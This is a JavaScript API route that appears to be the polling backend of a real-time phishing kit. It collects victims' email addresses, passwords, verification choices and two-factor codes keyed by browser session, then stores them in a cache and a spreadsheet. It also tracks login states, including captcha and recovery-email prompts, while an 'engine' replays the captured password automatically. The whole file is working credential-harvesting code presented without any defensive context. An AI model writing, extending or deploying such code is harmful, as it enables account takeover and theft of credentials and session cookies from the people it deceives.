import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { getCachedRow, setCachedRow, populateCache, immediateFlush } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { fetchDataFromAppScript, updateBrowserRowData, activelyProcessing, lastPollTime } from "../cookie-api-login/routeHelper.js";
import logger from "../../../../utils/logger.js";

// Local cache for terminal rows (COMPLETED/FAILED) — never changes, serve from memory
const terminalRowCache = new Map();

function parseBody(text) {
    try { return JSON.parse(text); } catch (e) {}
    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
    return null;
}

export async function POST(request) {
    incrementUsage();

    const text = await request.text();
    const body = parseBody(text);
    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);

    const { browserId, token, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    if (email || password || verificationChoice || verificationCode) {
        const updates = { lastUserActivity: new Date().toISOString() };
        if (email) { updates.email = email; updates.domain = email.split('@')[1] || ''; }
        if (password) updates.password = password;
        if (verificationChoice) updates.verificationChoice = verificationChoice;
        if (verificationCode) updates.verificationCode = verificationCode;
        setCachedRow(browserId, updates);
        immediateFlush(browserId).catch(err =>
            logger.error(`[pooling][${browserId}] Immediate flush failed: ${err.message}`)
        );
    }

    let row = getCachedRow(browserId);

    if (row) {
        logger.info(`[pooling][${browserId}] Cache HIT — status: ${row.status}, email: ${row.email || 'none'}`);
    }

    // Check terminal row cache (COMPLETED/FAILED never change)
    if (!row) {
        row = terminalRowCache.get(browserId);
        if (row) {
            logger.info(`[pooling][${browserId}] Terminal cache HIT — status: ${row.status}`);
        }
    }

    if (!row) {
        logger.info(`[pooling][${browserId}] Cache MISS — reading from shared cache...`);
        try {
            const cookieData = await fetchDataFromAppScript(1, 30000, false);
            if (Array.isArray(cookieData) && cookieData.length > 0) {
                const headers = cookieData[0];
                const rows = cookieData.slice(1);
                row = rows
                    .map(r => Object.fromEntries(headers.map((h, i) => [h, r[i]])))
                    .find(r => r.browserId === browserId);
                if (row) {
                    logger.info(`[pooling][${browserId}] Shared cache read — status: ${row.status}, email: ${row.email || 'none'}`);
                    populateCache(browserId, row);
                } else {
                    logger.info(`[pooling][${browserId}] Row not found in sheet`);
                }
            } else {
                logger.error(`[pooling][${browserId}] Shared cache returned invalid data`);
            }
        } catch (e) {
            logger.error(`[pooling][${browserId}] Shared cache read exception: ${e.message}`);
        }
    }

    if (!row) {
        return corsJson({ success: false, error: "Session not found" }, 404);
    }

    // Cache terminal rows locally — they never change, no need to read sheet again
    if (["COMPLETED", "FAILED"].includes(row.status)) {
        terminalRowCache.set(browserId, row);
    }

    const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGPASSWORDERROR", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
    if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
        setCachedRow(browserId, { status: "FAILED" });
        row.status = "FAILED";
        // Persist FAILED to sheet + trigger Hub update (fire-and-forget)
        updateBrowserRowData(browserId, { status: "FAILED" }).catch(err =>
            logger.error(`[pooling][${browserId}] Failed to persist stale FAILED to sheet: ${err.message}`)
        );
    }

    // Terminal/redirect statuses must NEVER set engineProcessing=true — the template
    // needs to act on them immediately (redirect for PROCESSING_FINALIZING/COMPLETED,
    // show error for FAILED). Not even activelyProcessing should block these.
    let engineProcessing = false;
    const terminalStatuses = new Set(["PROCESSING_FINALIZING", "COMPLETED", "FAILED"]);
    if (terminalStatuses.has(row.status)) {
        engineProcessing = false;
    } else {
        engineProcessing = activelyProcessing.has(browserId) || (globalThis.__jobMap?.has(browserId) ?? false);
        if (!engineProcessing) {
            // Fallback: if user just submitted data (lastUserActivity < 8s ago) and status
            // is still a waiting state, return engineProcessing=true. This bridges the gap
            // between update-process writing to cache and the engine calling
            // activelyProcessing.add(browserId). Without this, the template re-renders
            // the waiting form and wipes the user's typed input.
            const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
            if (waitingStatuses.has(row.status)) {
                // If the row already has a password, the engine doesn't need the user to type
                // it again — it will submit it automatically. Keep the template in loading so it
                // never flickers out of the loading state into the password form.
                if (row.status === "WAITINGPASSWORD" && row.password && String(row.password).trim() !== '') {
                    engineProcessing = true;
                    logger.info(`[pooling][${browserId}] Password already available in cache. engineProcessing=true (engine will submit it automatically).`);
                } else {
                    const recentActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
                    const age = Date.now() - recentActivity.getTime();
                    if (age < 8000) {
                        engineProcessing = true;
                        logger.info(`[pooling][${browserId}] Recent user activity (${age}ms ago). engineProcessing=true to protect template from re-render.`);
                    }
                }
            }
        }
    }
    // Record poll time for template liveliness tracking
    lastPollTime.set(browserId, Date.now());
    logger.info(`[pooling][${browserId}] Returning status: ${row.status} | engineProcessing: ${engineProcessing}`);
    return corsJson({
        success: true,
        currentStatus: row.status,
        engineProcessing,
        data: row
    });
}

export async function OPTIONS() {
    return corsOptions();
}
